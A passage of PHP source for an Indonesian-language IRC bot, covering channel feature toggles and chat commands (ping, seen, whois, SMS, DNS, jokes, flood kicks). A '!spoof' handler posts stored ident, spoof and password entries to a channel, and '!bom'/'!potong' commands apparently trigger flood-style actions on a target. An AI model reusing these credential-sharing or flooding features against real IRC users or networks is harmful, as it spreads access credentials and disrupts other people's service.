                                            if($cmdin==1){$targetsys=$Params[2];if($dCom[1]){$targetsys=$dCom[1];}$sysok=1;}
                                            elseif($cmdin==2 && $dCom[1]){$targetsys=$dCom[1];$sysok=1;}
                                            if (!ereg("#",$targetsys)){$targetsys="#".$targetsys;}
                                            if($wsys=='PING' && $sysok==1 && $getlvl > 2){
                                                $systembot['PING'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'PING '. strtoupper($targetsys).' is [4'.strtoupper($systembot['PING'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='WHOIS' && $sysok==1 && $getlvl > 2){
                                                $systembot['WHOIS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'WHOIS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['WHOIS'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='ALL' && $sysok==1 && $getlvl > 2){
                                                $systembot['PING'][strtoupper($targetsys)]= $onoff;
                                                $systembot['AUTOCYCLE'][strtoupper($targetsys)]= $onoff;
                                                $systembot['WHOIS'][strtoupper($targetsys)]= $onoff;
                                                $systembot['GUARD'][strtoupper($targetsys)]= $onoff;
                                                $systembot['AUTOJOIN'][strtoupper($targetsys)]= $onoff;
                                                $systembot['IP'][strtoupper($targetsys)]= $onoff;
                                                $systembot['NGOMONG'][strtoupper($targetsys)]= $onoff;
                                                $systembot['SMS'][strtoupper($targetsys)]= $onoff;
                                                $systembot['BERITA'][strtoupper($targetsys)]= $onoff;
                                                $systembot['GVOICE'][strtoupper($targetsys)]= $onoff;
                                                $systembot['SEEN'][strtoupper($targetsys)]= $onoff;
                                                $systembot['BADWORD'][strtoupper($targetsys)]= $onoff;
                                                $systembot['VERSION'][strtoupper($targetsys)]= $onoff;
                                                $systembot['GREET'][strtoupper($targetsys)]= $onoff;
                                                $systembot['DNS'][strtoupper($targetsys)]= $onoff;
                                                $systembot['FS'][strtoupper($targetsys)]= $onoff;
                                                $systembot['CHAT'][strtoupper($targetsys)]= $onoff;
                                                $systembot['GUYON'][strtoupper($targetsys)]= $onoff;
                                                $systembot['JPESAN'][strtoupper($targetsys)]= $onoff;
                                                $modbot->notice($fp,$fsrc[nick],"All system ".$targetsys." sekarang ".$onoff);
                                                $maxkar=200;$floddban="ON";$Maxreep=2;
                                            }
                                            if($wsys=='GUARD' && $sysok==1 && $getlvl > 2){
                                                $systembot['GUARD'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'GUARD '. strtoupper($targetsys).' is [4'.strtoupper($systembot['GUARD'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='JVERSION' && $sysok==1 && $getlvl > 2){
                                                $systembot['JVERSION'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'JVERSION '. strtoupper($targetsys).' is [4'.strtoupper($systembot['JVERSION'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='GVOICE' && $sysok==1 && $getlvl > 2){
                                                $systembot['GVOICE'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'GVOICE '. strtoupper($targetsys).' is [4'.strtoupper($systembot['GVOICE'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SEEN' && $sysok==1 && $getlvl > 2){
                                                $systembot['SEEN'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SEEN '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SEEN'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SMS' && $sysok==1 && $getlvl > 2){
                                                $systembot['SMS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SMS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SMS'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='FS' && $sysok==1 && $getlvl > 2){
                                                $systembot['FS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'FS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['FS'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='CHAT' && $sysok==1 && $getlvl > 2){
                                                $systembot['CHAT'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'CHAT '. strtoupper($targetsys).' is [4'.strtoupper($systembot['CHAT'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='GUYON' && $sysok==1 && $getlvl > 2){
                                                $systembot['GUYON'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'GUYON '. strtoupper($targetsys).' is [4'.strtoupper($systembot['GUYON'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='JPESAN' && $sysok==1 && $getlvl > 2){
                                                $systembot['JPESAN'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'JPESAN '. strtoupper($targetsys).' is [4'.strtoupper($systembot['JPESAN'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='BERITA' && $sysok==1 && $getlvl > 2){
                                                $systembot['BERITA'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'BERITA '. strtoupper($targetsys).' is [4'.strtoupper($systembot['BERITA'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SCANSPY' && $sysok==1 && $getlvl > 2){
                                                $systembot['SCANSPY'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SCANSPY '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SCANSPY'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='JAM' && $sysok==1 && $getlvl > 2){
                                                $systembot['JAM'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'JAM '. strtoupper($targetsys).' is [4'.strtoupper($systembot['JAM'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='BADWORD' && $sysok==1 && $getlvl > 2){
                                                $systembot['BADWORD'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'BADWORD '. strtoupper($targetsys).' is [4'.strtoupper($systembot['BADWORD'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='NGOMONG' && $sysok==1 && $getlvl > 2){
                                                $systembot['NGOMONG'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'NGOMONG '. strtoupper($targetsys).' is [4'.strtoupper($systembot['NGOMONG'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='VERSION' && $sysok==1 && $getlvl > 2){
                                                $systembot['VERSION'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'VERSION '. strtoupper($targetsys).' is [4'.strtoupper($systembot['VERSION'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='TIME' && $sysok==1 && $getlvl > 2){
                                                $systembot['TIME'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'TIME '. strtoupper($targetsys).' is [4'.strtoupper($systembot['TIME'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='IP' && $sysok==1 && $getlvl > 2){
                                                $systembot['IP'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'IP '. strtoupper($targetsys).' is [4'.strtoupper($systembot['IP'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='FINGER' && $sysok==1 && $getlvl > 2){
                                                $systembot['FINGER'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'FINGER '. strtoupper($targetsys).' is [4'.strtoupper($systembot['FINGER'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='ISON' && $sysok==1 && $getlvl > 2){
                                                $systembot['ISON']['ALL']= $onoff;$modbot->notice($fp,$fsrc[nick],'ISON is [4'.strtoupper($systembot['ISON']['ALL']).']');
                                            }
                                            if($wsys=='ASTRO' && $sysok==1 && $getlvl > 2){
                                                $systembot['ASTRO'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'ASTRO '. strtoupper($targetsys).' is [4'.strtoupper($systembot['ASTRO'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SPOOF' && $sysok==1 && $getlvl > 2){
                                                $systembot['SPOOF'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SPOOF '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SPOOF'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='DNS' && $sysok==1 && $getlvl > 2){
                                                $systembot['DNS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'DNS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['DNS'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='BOM' && $sysok==1 && $getlvl > 2){
                                                $systembot['BOM'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'BOM '. strtoupper($targetsys).' is [4'.strtoupper($systembot['BOM'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='GREET' && $sysok==1 && $getlvl > 2){
                                                $systembot['GREET'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'GREET '. strtoupper($targetsys).' is [4'.strtoupper($systembot['GREET'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SMS' && $sysok==1 && $getlvl > 2){
                                                $systembot['SMS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SMS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SMS'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SLAPS' && $sysok==1 && $getlvl > 2){
                                                $systembot['SLAPS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SLAPS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SLAPS'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='KSLANG' && $sysok==1 && $getlvl > 2){
                                                $systembot['KSLANG'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'KSLANG '. strtoupper($targetsys).' is [4'.strtoupper($systembot['KSLANG'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='AUTOCYCLE' && $sysok==1 && $getlvl > 2){
                                                $systembot['AUTOCYCLE'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'AUTOCYCLE '. strtoupper($targetsys).' is [4'.strtoupper($systembot['AUTOCYCLE'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='AUTOJOIN' && $sysok==1 && $getlvl > 2){
                                                $systembot['AUTOJOIN'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'AUTOJOIN '. strtoupper($targetsys).' is [4'.strtoupper($systembot['AUTOJOIN'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='AUTOAWAY' && $sysok==1 && $getlvl > 2){
                                                $systembot['AUTOAWAY']['ALL']= $onoff;$modbot->notice($fp,$fsrc[nick],'AUTOAWAY is [4'.strtoupper($systembot['AUTOAWAY']['ALL']).']');
                                            }
                                            if($wsys=='LISTGREET' && $dCom[1] && $dCom[2] && $getlvl > 2){
                                                if($onoff=="3ON"){
                                                $ddc=strtolower($dCom[1]);$greetmsg["$ddc"]["nama"]=$dCom[1];$mgreet=str_replace($dCom[0]." ".$dCom[1]." ","",$TxtMsg);
						$greetmsg["$ddc"]["msg"]=$mgreet;$modbot->notice($fp,$fsrc[nick],'Auto Greet For :'.$greetmsg["$ddc"]["nama"]);
                                                $modbot->notice($fp,$fsrc[nick],'Auto Greet Msg :'.$greetmsg["$ddc"]["msg"]);
                                                }else{$eel=strtolower($dCom[1]);unset($greetmsg["$eel"]["nama"]);unset($greetmsg["$eel"]["msg"]);$modbot->notice($fp,$fsrc[nick],'Delete Greet For :'.$eel);}
                                            }
                                            if($wsys=='LISTISON' && $dCom[1] && $getlvl > 2){
                                                if($onoff=="3ON"){
                                                    if($modbot->add_ison($dCom[1])==1){$modbot->notice($fp,$fsrc[nick],$dCom[1] . ' is now in my list');}
                                                    else{$modbot->notice($fp,$fsrc[nick],$dCom[1] . ' is already in my list');}
                                                }
                                                else{if($modbot->del_ison($dCom[1])==1){$modbot->notice($fp,$fsrc[nick],$dCom[1] . ' has been deleted');}}
                                            }
                                        }
                                        ################################ SYSTEM ###################################
                                            
                                    }
                                }
                                ###############################
                                elseif (substr($Params[3],0,2)==':!'){
                                    if (strtolower($Params[3])==':!ping' && ereg('#',$Params[2]) && $systembot['PING'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                            if(strtolower($dCom[1])=='me'){$modbot->stuf_ping($fp,$Params[2],$fsrc[nick]);}else {$modbot->stuf_ping($fp,$Params[2],$dCom[1]);}
                                        }else{$modbot->stuf_ping($fp,$Params[2],$fsrc[nick]);}
                                    }
                                    elseif (strtolower($Params[3])==':!version' && ereg('#',$Params[2]) && $systembot['VERSION'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                        $modbot->msg($fp,$Params[4],'VERSION');$datversi[strtolower($Params[4])]["nick"]=strtolower($Params[4]);$datversi[strtolower($Params[4])]["chan"]=$Params[2];
                                        }else{$modbot->msg($fp,$fsrc[nick],'Perintah salah! Ketik !version <nick>');}
                                    }
                                    elseif (strtolower($Params[3])==':!jam' && ereg('#',$Params[2]) && $systembot['JAM'][strtoupper($Params[2])]=="3ON") {
                                         $sekarang=date("l, j F Y H:i:s");
                                         $modbot->msg($fp,$Params[2],"sekarang : 12[8".$sekarang."12]");
                                    }
                                    elseif (strtolower($Params[3])==':!seen' && ereg('#',$Params[2]) && $systembot['SEEN'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                           $nicksenn=strtolower($dCom[1]);
                                           $waktuseennya=time();
                                           $lamaseen= $waktuseennya - $asalseen[$nicksenn];
                                           $asilhari=0;$asilejam=0;$asilmeni=0;
                                           if ($lamaseen>=86400){$asilhari = $lamaseen / 86400;$hari = floor($asilhari)."12hari "; $sisane = $lamaseen - ($hari*86400);$lamaseen = $sisane;   }else{$hari =""; }
                                           if ($lamaseen>=3600) {$asilejam = $lamaseen / 3600; $jamm = floor($asilejam)."12jam ";  $sisane = $lamaseen - ($jamm*3600); $lamaseen = $sisane;   }else{$jamm =""; }
                                           if ($lamaseen>=60)   {$asilmeni = $lamaseen / 60;   $ment = floor($asilmeni)."12menit ";$sisane = $lamaseen - ($ment*60);   $lamaseen = $sisane;   }else{$ment =""; }
                                           if ($asilhari == 0){$katahari="";        }else{$katahari=$hari;              }
                                           if ($asilejam == 0){$kataejam="";        }else{$kataejam=$jamm;              }
                                           if ($asilmeni == 0){$katameni="";        }else{$katameni=$ment;              }
                                           if ($lamaseen == 0){$katadeti="";        }else{$katadeti=$lamaseen."06detik"; }
                                           $katamsgseen = $katahari." ".$kataejam." ".$katameni." ".$katadeti;
                                           if($asalseen[$nicksenn.'chanel']=="ini"){$asalseen[$nicksenn.'chanel']="$Params[2]"; }
                                           if($asalseen[$nicksenn]){
                                              if($asalseen[$nicksenn]=="ada"){
                                                  $modbot->msg($fp,$Params[2],"TuH Si 4[ ".$nicksenn." 4] MaSi oNLiNe... 9!whois 6".$nicksenn." aJa Dah 4..8.:3::15 ".$fsrc[nick]." 3::8:.4..");
                                              }
                                              elseif($asalseen[$nicksenn]=="ganti"){
                                                  $modbot->msg($fp,$Params[2],"HmMmM....   Lok Ga SaLah 4[ ".$nicksenn." 4] GaNti NiCk JaDi4 ".$asalseen[$nicksenn.'chanel']." 4..8.:3::15 ".$fsrc[nick]." 3::8:.4..");
                                              }
                                              else{$modbot->msg($fp,$Params[2],"KaTa BoZzZ SiCh 4[ ".$nicksenn." 4] ".$asalseen[$nicksenn.'status']." DaRi ChaNNeL 1,3<15>4,9[1 ".$asalseen[$nicksenn.'chanel']." 4,9]1,3<15> ".$katamsgseen." yaNg LaLu 4..8.:3::15 ".$fsrc[nick]." 3::8:.4..");   }
                                           }else{$modbot->msg($fp,$Params[2],"Si 4[ ".$dCom[1]." 4] GaK aDa Di DaTa SaiA 4..8.:3::15 ".$fsrc[nick]." 3::8:.4..");  }
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !seen <nick>');}
                                    }
                                    elseif (strtolower($Params[3])==':!whois' && ereg('#',$Params[2]) && $systembot['WHOIS'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
					$datwhois[strtolower($dCom[1])]["nick"]=strtolower($dCom[1]);
					$datwhois[strtolower($dCom[1])]["chan"]=$Params[2];
                                        $modbot->send($fp,'WHOIS '.$dCom[1]);
                                        }
                                        else{
                                            $modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik :!whois <nick>');
                                        }
                                    }
                                    elseif (strtolower($Params[3])==':!chat' && ereg('#',$Params[2]) && $systembot['CHAT'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                         $chchan=$dCom[1];
                                         if (!ereg("#",$dCom[1])) { $chchan="#".$dCom[1]; }
                                         if (strlen($Params[5]) != 0 ){
                                           $comandchat=str_replace(":","",$Params[3]);
                                           $pesannya=str_replace($comandchat,"",$TxtMsg);
                                           $pesannya=str_replace($Params[4],"",$pesannya);
                                           if (strlen($pesannya) >= 150 ){$pesannya=substr($pesannya,0,150);}
                                             if( strtolower($Params[2]) != strtolower($chchan) ){$modbot->msg($fp,$chchan,$pesannya." chat dari ".$fsrc[nick]." di "."$Params[2]");}else{$modbot->msg($fp,$Params[2],"La kok Chat di chan ini to ".$fsrc[nick]." gila loh");}
                                         }else{$modbot->msg($fp,$fsrc[nick],"mana pesannya bro");}
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !chatt <#chan> <pesan>');}
                                    }
                                    elseif (strtolower($Params[3])==':!pesan' && ereg('#',$Params[2]) && $systembot['JPESAN'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                         if (strlen($Params[5]) != 0 ){
                                           $nicktargetnya=strtolower($dCom[1]);
                                           $comandchat=str_replace(":","",$Params[3]);
                                           $pesannya=str_replace($comandchat,"",$TxtMsg);
                                           $pesannya=str_replace($Params[3],"",$pesannya);
                                           $pesannya=str_replace($Params[4],"",$pesannya);
                                           if (strlen($pesannya) >= 150 ){$pesannya=substr($pesannya,0,150);}
                                           $nickpesan[$nicktargetnya]=" 12[8 ".$fsrc[nick]." 12] beri pesan buat kamu ".$pesannya ;
                                           $modbot->msg($fp,$fsrc[nick],'ok ntar tak sampein ke '. $nicktargetnya.' pesanmu!!!');
                                         }else{$modbot->msg($fp,$fsrc[nick],"mana pesannya bro");}
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !pesan <nick> <pesan>');}
                                    }
                                    elseif (strtolower($Params[3])==':!sms' && ereg('#',$Params[2]) && $systembot['SMS'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                           if($Params[4]){
                                              $nomorygdituju=$dCom[1];
                                              $comandsms=str_replace(":","",$Params[3]);
                                              $pesansmsnya=str_replace($comandsms,"",$TxtMsg);
                                              $pesansmsnya=str_replace($dCom[1],"",$TxtMsg);
                                              $pesansmsnya=str_replace($Params[4],"",$TxtMsg);
                                              $modbot->msg($fp,$Params[2],'12[8Sms12] 12[8'.$fsrc[nick].'12] 12'.$modbot->mod_kirimsms($fp,$nomorygdituju,$pesansmsnya).' 12');
                                           }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !sms <nomor> <pesan>');}
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !sms <nomor> <pesan>');}
                                    }
                                    elseif (strtolower($Params[3])==':!sms' && ereg('#',$Params[2]) && $systembot['SMS'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                           if($Params[4]){
                                              $nomorygdituju=$dCom[1];
                                              $comandsms=str_replace(":","",$Params[3]);
                                              $pesansmsnya=str_replace($comandsms,"",$TxtMsg);
                                              $pesansmsnya=str_replace($dCom[1],"",$TxtMsg);
                                              $pesansmsnya=str_replace($Params[4],"",$TxtMsg);
                                              $modbot->msg($fp,$Params[2],' 14.:4[14:. 7SmS 14.:4]14:. 4..8.:3::7 '.$fsrc[nick].' 3::8:.4..14 '.$modbot->mod_kirimsms($fp,$nomorygdituju,$pesansmsnya).' 12');
                                           }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !sms <nomor> <pesan>');}
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !sms <nomor> <pesan>');}
                                    }
                                    elseif (strtolower($Params[3])==':!tarik' && ereg('#',$Params[2]) && $systembot['GUYON'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){$modbot->act($fp,$Params[2],"6Tarik ".$dCom[1]." LaLu MeNCiUmNya EmMuWaCh... :P");}
                                    }
                                    elseif (strtolower($Params[3])==':!pukul' && ereg('#',$Params[2]) && $systembot['GUYON'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){$modbot->act($fp,$Params[2],"4PuKuL ".$dCom[1]." BaGh BuGh GdEbAgH GeDeBuGh GeDuBrAk KrOMpYaNG...KrOMpYaNG... AdUh AnCuR PeRaBoTaN MaK GuA T_T");}
                                    }
                                    elseif (strtolower($Params[3])==':!tendang' && ereg('#',$Params[2]) && $systembot['GUYON'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){$modbot->act($fp,$Params[2],"12TeNDaNG ".$dCom[1]." PaKe JuRuS TeNDaNGaN TaNPa BaYaNGaN CiAaAaAaAaAaT..!!! HaKDeZ...!! TuInK... :P");}
                                    }
                                    elseif (strtolower($Params[3])==':!time' && ereg('#',$Params[2]) && $systembot['TIME'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                        $modbot->msg($fp,$Params[4],'TIME');$dattime[strtolower($Params[4])]["nick"]=strtolower($Params[4]);$dattime[strtolower($Params[4])]["chan"]=$Params[2];}
                                        else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !time <nick>');}
                                    }
                                    elseif (strtolower($Params[3])==':!finger' && ereg('#',$Params[2]) && $systembot['FINGER'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                        $modbot->msg($fp,$Params[4],'FINGER');$datfinger[strtolower($Params[4])]["nick"]=strtolower($Params[4]);$datfinger[strtolower($Params[4])]["chan"]=$Params[2];
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !finger <nick>');}
                                    }
                                    elseif (strtolower($Params[3])==':!ip' && ereg('#',$Params[2]) && $systembot['IP'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                           $modbot->msg($fp,$Params[2],'BeNtaR... Saia TaNya aMa BoZzZ darso dLo eaH 4..8.:3::15 '.$fsrc[nick].' 3::8:.4..');
                                           $modbot->notice($fp,$Params[2],'4K12aLo 4[ '.$dCom[1].' 4] 4J9aDiNya 6'.$modbot->mod_lookip($fp,$Params[4]).' 7'.$fsrc[nick]);
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !ip <Ip>');}
                                    }
                                    elseif (strtolower($Params[3])==':!berita' && ereg('#',$Params[2]) && $systembot['BERITA'][strtoupper($Params[2])]=="3ON") {
                                           $modbot->notice($fp,$Params[2],'14.:4[14:.7BeRiTa14.:4]14:. 11'.$modbot->mod_lookberitaperson($fp).' '.$fsrc[nick]);
                                    }
                                    elseif (strtolower($Params[3])==':!info' && ereg('#',$Params[2]) && $systembot['BERITA'][strtoupper($Params[2])]=="3ON") {
                                           $modbot->msg($fp,$Params[2],'14.:4[14:.7BeRiTa14.:4]14:. 11'.$modbot->mod_lookberitaperson($fp).' '.$fsrc[nick]);
                                    }
                                    elseif (strtolower($Params[3])==':!fs' && ereg('#',$Params[2]) && $systembot['FS'][strtoupper($Params[2])]=="3ON") {
                                           $modbot->msg($fp,$Params[2],'4..8.:3::15FRieNDsTeR3::8:.4.. 11'.$modbot->mod_lookfs($fp,$Params[4]).' 7'.$fsrc[nick]);
                                    }
                                    elseif (strtolower($Params[3])==':!dns' && ereg('#',$Params[2]) && $systembot['DNS'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                            if (ereg("[a-zA-Z]", $dCom[1])) {$res = gethostbyname($dCom[1]);}
                                            elseif (ereg("[0-9]", $dCom[1])) {$res = gethostbyaddr($dCom[1]);}
                                            if ($res==$dCom[1]) { $res = "not resolved."; }
                                            else { $res = " $res ."; }
                                            $modbot->msg($fp,$Params[2],'4K12aLo 4[ '.$dCom[1] . ' 4]9 ' .$res);
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !dns <host>');}
                                    }
                                    elseif (strtolower($Params[3])==':!astro' && ereg('#',$Params[2]) && $systembot['ASTRO'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                            $modbot->notice($fp,$fsrc[nick],'15(04Astro15) '. $modbot->mod_astro($dCom[1]));
                                        }else{
                                            $modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik :!astro <bintang>');
                                        }
                                    }
                                    elseif (strtolower($Params[3])==":!spoof" && ereg('#',$Params[2]) && $systembot['SPOOF'][strtoupper($Params[2])]=="3ON") {
					$spoofnya=strtolower($Params[4]);
					if ($Params[5]<=$jmlspoof["$spoofnya"] && $Params[5]>0){
						fputs($fp,'PRIVMSG '.$Params[2].' :15(04Spoof15) Ident: 4' . $isisp["$Params[5]"]["$spoofnya"]["ident"] .' Spoof: 4' . $isisp["$Params[5]"]["$spoofnya"]["spoof"] .' Passw: 4' . $isisp["$Params[5]"]["$spoofnya"]["pass"].''. CRLF);
					}
					else {$modbot->notice($fp,$frsc[nick],'15(04Spoof15) Request Error');}
                                    }
                                    elseif (strtolower($Params[3])==":!kslang" && ereg('#',$Params[2]) && $systembot['KSLANG'][strtoupper($Params[2])]=="3ON") {
                                        $ktslsl=str_replace($Params[3]." ".$Params[4]." ","",":".$TxtMsg);
                                        if($Params[4]<=$kmjml[strtolower($ktslsl)] && $Params[4]>0){
                                            $nomere=$Params[4]-1;
                                            if(strpos($kmusedan[$nomere]["definisi"][strtolower($ktslsl)],"<br>")){
                                            $defedan=explode("<br>",$kmusedan[$nomere]["definisi"][strtolower($ktslsl)]);
                                                foreach ($defedan as $darredan) {
                                                    $modbot->notice($fp,$fsrc[nick],'15(04Arti15) '.$darredan);
                                                    sleep(1);
                                                }
                                            }
                                            elseif($kmusedan[$nomere]["definisi"][strtolower($ktslsl)]){
                                                $modbot->notice($fp,$fsrc[nick],'15(04Arti15) '.$kmusedan[$nomere]["definisi"][strtolower($ktslsl)]);
                                            }
                                            if(strpos($kmusedan[$nomere]["contoh"][strtolower($ktslsl)],"<br>")){
                                                $defedan=explode("<br>",$kmusedan[$nomere]["contoh"][strtolower($ktslsl)]);
                                                foreach ($defedan as $darredan) {
                                                    $modbot->notice($fp,$fsrc[nick],'15(04Cth15) '.$darredan);
                                                        sleep(1);
                                                }
                                            }
                                            elseif($kmusedan[$nomere]["contoh"][strtolower($ktslsl)]){
                                                $modbot->notice($fp,$fsrc[nick],'15(04Cth15) '.$kmusedan[$nomere]["contoh"][strtolower($ktslsl)]);
                                            }
                                        }
                                        else{
                                            fputs($fp,'PRIVMSG '.$Params[2].' :15(04KSlang15) Request Error'. CRLF);
                                        }
                                        
                                    }
                                    elseif (strtolower($Params[3])==':!update' && ereg('#',$Params[2]) && $Params[5]) {
                                        $typeup=strtolower($Params[4]);
                                        if($typeup=='spoof' && $systembot['SPOOF'][strtoupper($Params[2])]=="3ON"){
                                            $modbot->msg($fp,$Params[2],'15(04Spoof15) Update Complete! FOUND :'.$modbot->mod_uspoof($fp,$Params[5]).' Spoof');
                                        }
                                        elseif($typeup=='kslang' && $systembot['KSLANG'][strtoupper($Params[2])]=="3ON"){
                                            $ktslsl=str_replace($Params[3]." ".$Params[4]." ","",":".$TxtMsg);
                                            $modbot->msg($fp,$Params[2],'15(04KSlang15) Update Complete! FOUND :'.$modbot->mod_uslang($fp,$ktslsl).' Arti'); 
                                        }
                                    }
                                    elseif (strtolower($Params[3])==":!bom" && ereg('#',$Params[2]) && $Params[4] && $systembot['BOM'][strtoupper($Params[2])]=="3ON") {
                                        $modbot->stuf_bom($fp,$Params[2],$Params[4]);
                                    }
                                    elseif (strtolower($Params[3])==":!potong" && ereg('#',$Params[2]) && $Params[4] && $systembot['BOM'][strtoupper($Params[2])]=="3ON") {
                                        $modbot->stuf_potong($fp,$fsrc[nick],$Params[2],$Params[4]);
                                    }
                                }
                                elseif (strlen(strtolower($TxtMsg))>=$maxkar) {
                                    if (substr($Params[3],0,1)==':' && ereg('#',$Params[2]) && $systembot['GUARD'][strtoupper($Params[2])]=="3ON") {
                                      if ($floddban == "ON"){$modbot->ban($fp,$Params[2],"*!*@".$fsrc[host]);  }
                                      $modbot->kick($fp,$Params[2],$fsrc[nick],"4,14Ojo ngeflood cuokK..!!");
                                      if ($floddban == "ON"){
                                          sleep(5);sleep(2);
                                          if($systembot['NGOMONG'][strtoupper($Params[2])]=="3ON"){$modbot->msg($fp,$Params[2],"Aku BuKa +b DeCh... ".$fsrc[nick]." WaJaHnYa MaNgEnAsKaN NuH...!!!");    }
                                          sleep(2);
                                          $modbot->unban($fp,$Params[2],"*!*@".$fsrc[host]);
                                      }
                                    }
                                }
                                elseif (substr($Params[3],0,1)==':') {
                                  $naidiceluk=substr($Params[3],1,(strlen($Params[3])));
                                  if ((substr_count(strtolower($TxtMsg),strtolower($bot['nick']))>0)OR(substr_count(strtolower($TxtMsg),strtolower($bot['realname']))>0)) {
                                                if($systembot['NGOMONG'][strtoupper($Params[2])]=="3ON"){
                                                $ada = FALSE;
